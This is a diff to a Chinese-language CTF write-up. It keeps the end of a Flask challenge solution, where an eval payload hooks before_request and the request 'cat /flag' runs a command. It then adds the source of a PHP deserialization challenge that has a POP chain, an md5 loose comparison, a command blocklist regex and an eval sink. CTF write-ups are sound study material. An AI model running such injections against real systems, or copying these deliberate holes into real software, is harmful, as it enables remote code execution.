@@ -1,4 +1,4 @@
-# week 1
+# week 3
 
 ## 【这又是什么函数】
 先目录扫描发现`/src` 路由，得到源代码
@@ -34,3 +34,78 @@ e=eval("__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_f
 ```
 打入之后会在当前路由加载前执行get传入的命令，我们直接访问当前路由`doit?0=cat /flag` 即可
 ![](assets/？CTF/file-20251202164749968.png)
+# week 4
+## 【Path to Hero】
+给了我们源码
+```php
+<?php
+highlight_file('index.php');
+
+Class Start
+{
+    public $ishero;
+    public $adventure;
+
+
+    public function __wakeup(){
+
+        if (strpos($this->ishero, "hero") !== false && $this->ishero !== "hero") {
+            echo "<br>勇者啊，去寻找利刃吧<br>";
+
+            return $this->adventure->sword;
+        }
+        else{
+            echo "前方的区域以后再来探索吧！<br>";
+        }
+    }
+}
+
+class Sword
+{
+    public $test1;
+    public $test2;
+    public $go;
+
+    public function __get($name)
+    {
+        if ($this->test1 !== $this->test2 && md5($this->test1) == md5($this->test2)) {
+            echo "沉睡的利刃被你唤醒了，是时候去讨伐魔王了！<br>";
+            echo $this->go;
+        } else {
+            echo "Dead";
+        }
+    }
+}
+
+class Mon3tr
+{
+    private $result;
+    public $end;
+
+    public function __toString()
+    {
+        $result = new Treasure();
+        echo "到此为止了！魔王<br>";
+
+        if (!preg_match("/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i", $this->end)) {
+            $result->end($this->end);
+        } else {
+            echo "难道……要输了吗？<br>";
+        }
+        return "<br>";
+    }
+}
+
+class Treasure
+{
+    public function __call($name, $arg)
+    {
+        echo "结束了？<br>";
+        eval($arg[0]);
+    }
+}
+
+if (isset($_POST["HERO"])) {
+    unserialize($_POST["HERO"]);
+}
+```
